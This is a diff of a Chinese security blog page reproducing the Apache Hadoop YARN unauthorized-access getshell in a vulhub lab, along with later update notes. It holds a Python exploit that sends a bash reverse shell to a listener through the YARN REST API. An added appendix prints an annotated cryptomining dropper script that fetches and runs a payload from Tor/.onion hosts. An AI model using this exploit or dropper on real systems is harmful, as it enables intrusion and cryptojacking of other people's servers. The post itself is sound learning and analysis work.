@@ -6,17 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="环境： vulhub+centos 环境搭建步骤： 123cd hadoop&#x2F;unauthorized-yarn&#x2F;docker-compose up -ddocker ps查看状态  复现步骤： 1、采用以下脚本，修改相关URL&#x2F;ip&#x2F;port hadoop.py123456789101112131415161718192021222324import requeststarget &#x3D; &#39;http">
+    <meta name="description" content="环境：vulhub+centos 环境搭建步骤：123cd hadoop&#x2F;unauthorized-yarn&#x2F;docker-compose up -ddocker ps查看状态  复现步骤：1、采用以下脚本，修改相关URL&#x2F;ip&#x2F;port hadoop.py123456789101112131415161718192021222324import requeststarget &#x3D; &#39;http:&#x2F;&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Apache Hadoop未授权访问漏洞getshell">
 <meta property="og:url" content="http://yoursite.com/2020/11/09/Apache-Hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Egetshell/index.html">
 <meta property="og:site_name" content="R17a&#39;s blog">
-<meta property="og:description" content="环境： vulhub+centos 环境搭建步骤： 123cd hadoop&#x2F;unauthorized-yarn&#x2F;docker-compose up -ddocker ps查看状态  复现步骤： 1、采用以下脚本，修改相关URL&#x2F;ip&#x2F;port hadoop.py123456789101112131415161718192021222324import requeststarget &#x3D; &#39;http">
+<meta property="og:description" content="环境：vulhub+centos 环境搭建步骤：123cd hadoop&#x2F;unauthorized-yarn&#x2F;docker-compose up -ddocker ps查看状态  复现步骤：1、采用以下脚本，修改相关URL&#x2F;ip&#x2F;port hadoop.py123456789101112131415161718192021222324import requeststarget &#x3D; &#39;http:&#x2F;&#x2F;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://yoursite.com/imgs/image-20201109210854299.png">
 <meta property="og:image" content="http://yoursite.com/imgs/image-20201109210958609.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20201116184131459.png">
 <meta property="article:published_time" content="2020-11-09T13:02:31.000Z">
-<meta property="article:modified_time" content="2020-11-09T13:02:31.000Z">
+<meta property="article:modified_time" content="2020-11-16T12:03:59.326Z">
 <meta property="article:author" content="R17a">
 <meta property="article:tag" content="Hadoop">
 <meta property="article:tag" content="未授权">
@@ -83,6 +84,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" href="/2020/11/10/SaltStack-CVE-2020-11651-CVE-2020-11652%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" href="/2020/11/06/JBoss-jmx-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%87%B4GetShell%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -112,7 +115,7 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#环境："><span class="toc-number">1.</span> <span class="toc-text">环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#环境搭建步骤："><span class="toc-number">2.</span> <span class="toc-text">环境搭建步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#复现步骤："><span class="toc-number">3.</span> <span class="toc-text">复现步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#更新于11-13"><span class="toc-number">4.</span> <span class="toc-text">更新于11.13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#更新于11-16"><span class="toc-number">5.</span> <span class="toc-text">更新于11.16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#附录："><span class="toc-number">6.</span> <span class="toc-text">附录：</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -138,7 +141,7 @@
       
         <time datetime="2020-11-09T13:02:31.000Z" itemprop="datePublished">2020-11-09</time>
         
-        (Updated: <time datetime="2020-11-09T13:02:31.000Z" itemprop="dateModified">2020-11-09</time>)
+        (Updated: <time datetime="2020-11-16T12:03:59.326Z" itemprop="dateModified">2020-11-16</time>)
         
       
     </div>
@@ -163,13 +166,10 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>环境：</p>
-<p>vulhub+centos</p>
-<p>环境搭建步骤：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> hadoop/unauthorized-yarn/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps查看状态</span><br></pre></td></tr></table></figure>
+    <h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>vulhub+centos</p>
+<h4 id="环境搭建步骤："><a href="#环境搭建步骤：" class="headerlink" title="环境搭建步骤："></a>环境搭建步骤：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> hadoop/unauthorized-yarn/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps查看状态</span><br></pre></td></tr></table></figure>
 
-<p>复现步骤：</p>
-<p>1、采用以下脚本，修改相关URL/ip/port</p>
+<h4 id="复现步骤："><a href="#复现步骤：" class="headerlink" title="复现步骤："></a>复现步骤：</h4><p>1、采用以下脚本，修改相关URL/ip/port</p>
 <figure class="highlight python"><figcaption><span>hadoop.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://192.168.116.132:8088/'</span></span><br><span class="line">lhost = <span class="string">'192.168.116.132'</span>  <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps/new-application'</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">print(resp.text)</span><br><span class="line">app_id = resp.json()[<span class="string">'application-id'</span>]</span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps'</span></span><br><span class="line">cmd = <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1'</span> % lhost</span><br><span class="line"><span class="comment"># cmd = 'touch /tmp/1234.ss'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'application-id'</span>: app_id,</span><br><span class="line">    <span class="string">'application-name'</span>: <span class="string">'get-shell'</span>,</span><br><span class="line">    <span class="string">'am-container-spec'</span>: &#123;</span><br><span class="line">        <span class="string">'commands'</span>: &#123;</span><br><span class="line">            <span class="string">'command'</span>: cmd,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'application-type'</span>: <span class="string">'YARN'</span>,</span><br><span class="line">&#125;</span><br><span class="line">print(data)</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
 
 <p>2、开启监听，这里我在hadoop本地开的</p>
@@ -177,9 +177,16 @@
 
 <p>3、执行脚本即可</p>
 <p><img src="/imgs/image-20201109210854299.png" alt="image-20201109210854299"></p>
-<p>4、在这里记录下我的坑：docker启动hadoop后，发现有4个容器，其中会触发执行命令的在nodemanager这个容器内，如果创建了文件，也是在这个容器才能找到，我的docker环境不能访问外网，在docker-compose.yml文件加了network_mode:host配置能访问外网了但是不能成功连接外网监听，最后直接在docker服务器上开启了监听才成功连接的。</p>
+<p>4、在这里记录下我的坑：docker启动hadoop后，发现有4个容器，刚开始不知道是哪个容器执行了命令，找了半天，最后发现触发执行命令的在nodemanager这个容器内，如果创建了文件，也是在这个容器才能找到。我的docker环境不能访问外网，在docker-compose.yml文件加了network_mode:host配置能访问外网了但是不能成功连接外网监听，最后直接在docker服务器上开启了监听才成功连接的。</p>
 <p><img src="/imgs/image-20201109210958609.png" alt="image-20201109210958609"></p>
+<h4 id="更新于11-13"><a href="#更新于11-13" class="headerlink" title="更新于11.13"></a>更新于11.13</h4><p>某天刷公众号看到<a href="https://mp.weixin.qq.com/s/Em8ZmqHY7N8DNQ3uJl16ag分析到了我上次遇到的坑，这里补充下：" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Em8ZmqHY7N8DNQ3uJl16ag分析到了我上次遇到的坑，这里补充下：</a></p>
+<p>Hadoop2.0之后加入了YARN集群，Yarn集群的主节点承担了资源调度，Yarn集群的从节点中会选出一个节点（这个由redourcemanager决定）进行应用程序的调度。</p>
+<h4 id="更新于11-16"><a href="#更新于11-16" class="headerlink" title="更新于11.16"></a>更新于11.16</h4><p>想起上次大佬让我学习的挖矿就是这个漏洞，当时我没仔细去看，今天刚好分析下。于是问大佬要服务器环境，上去看了下貌似都清理干净了。</p>
+<img src="/imgs/image-20201116184131459.png" alt="image-20201116184131459" style="zoom:50%;" />
 
+<p>于是去网上搜了下.unixdb.sh成功找到一篇心仪的文章<a href="https://blog.csdn.net/hy19930118/article/details/107129496/" target="_blank" rel="noopener">记一次Linux挖矿木马清除</a>学习了下，另外附上上次大佬给的学习地址：<a href="https://paper.seebug.org/611/" target="_blank" rel="noopener">Hadoop Yarn REST API 未授权漏洞利用挖矿分析</a></p>
+<h4 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h4><p>大佬聊天记录给的脚本，分析脚本，发现该脚本主要功能是从远程地址下载恶意程序并执行，主要的代码注释如下</p>
+<figure class="highlight sh"><figcaption><span>/home/yarn/.unixdb.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">HDtLGYpXoNJVjcOT+tWEIJWYO+veDD+ftynLBTXOMpFl8jur3TPmuWCQFvISC1t2</span><br><span class="line"><span class="built_in">exec</span> &amp;&gt;/dev/null <span class="comment">#不显示任何输出</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6) <span class="comment">#先匹配到x:(id -u) 这行，然后根据:找到用户家目录，即在/etc/passwd中找到当前用户的家目录</span></span><br><span class="line">c=$(<span class="built_in">echo</span> <span class="string">"curl -4fsSLkA- -m200"</span>) <span class="comment"># -4:ipv4，-f:不输出错误，-sS:在选项 -s 中，当 curl 出现错误时将显示,-L:跟踪重定向,-k:不认证ssl，-A:User-Agent，-m：超时设置</span></span><br><span class="line">t=$(<span class="built_in">echo</span> <span class="string">"unixdbnuadxmwtob"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sockz函数功能：生成远程链接 并curl连接</span></span><br><span class="line"><span class="function"><span class="title">sockz</span></span>() &#123;</span><br><span class="line">n=(dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(<span class="built_in">echo</span> <span class="string">"dns-query?name=relay.tor2socks.in"</span>)</span><br><span class="line">s=$(<span class="variable">$c</span> https://<span class="variable">$&#123;n[$((RANDOM%12))]&#125;</span>/<span class="variable">$p</span> | grep -oE <span class="string">"\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b"</span> |tr <span class="string">' '</span> <span class="string">'\n'</span>|sort -uR|head -1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#在家目录或者tmp等文件下，新建文件i内容exit，赋予i执行权限，执行后删除i，执行成功一次后退出循环</span></span><br><span class="line"><span class="function"><span class="title">fexe</span></span>() &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$d</span> /tmp /var/tmp /dev/shm /usr/bin ;<span class="keyword">do</span> <span class="built_in">echo</span> <span class="built_in">exit</span> &gt; <span class="variable">$i</span>/i &amp;&amp; chmod +x <span class="variable">$i</span>/i &amp;&amp; <span class="built_in">cd</span> <span class="variable">$i</span> &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; <span class="built_in">break</span>;<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#u函数主要功能：从远程地址下载挖矿脚本到本地，赋予执行权限并执行，执行完就删除</span></span><br><span class="line"><span class="function"><span class="title">u</span></span>() &#123;</span><br><span class="line">sockz</span><br><span class="line">fexe</span><br><span class="line">f=/int.$(uname -m) <span class="comment">#操作系统多少位</span></span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-) <span class="comment">#获取日期md5值</span></span><br><span class="line"><span class="variable">$c</span> -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> || <span class="variable">$c</span> <span class="variable">$1</span><span class="variable">$f</span> -o<span class="variable">$x</span> <span class="comment">#socks5h代理，访问暗网地址下载挖矿脚本，并以日期的mad5命名</span></span><br><span class="line">chmod +x <span class="variable">$x</span>;<span class="variable">$x</span>;rm -f <span class="variable">$x</span> <span class="comment">#给脚本附加执行权限</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查恶意进程状态是否开启，未开始执行u函数</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; <span class="keyword">then</span></span><br><span class="line">u <span class="variable">$t</span>.<span class="variable">$h</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
@@ -206,7 +213,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#环境："><span class="toc-number">1.</span> <span class="toc-text">环境：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#环境搭建步骤："><span class="toc-number">2.</span> <span class="toc-text">环境搭建步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#复现步骤："><span class="toc-number">3.</span> <span class="toc-text">复现步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#更新于11-13"><span class="toc-number">4.</span> <span class="toc-text">更新于11.13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#更新于11-16"><span class="toc-number">5.</span> <span class="toc-text">更新于11.16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#附录："><span class="toc-number">6.</span> <span class="toc-text">附录：</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
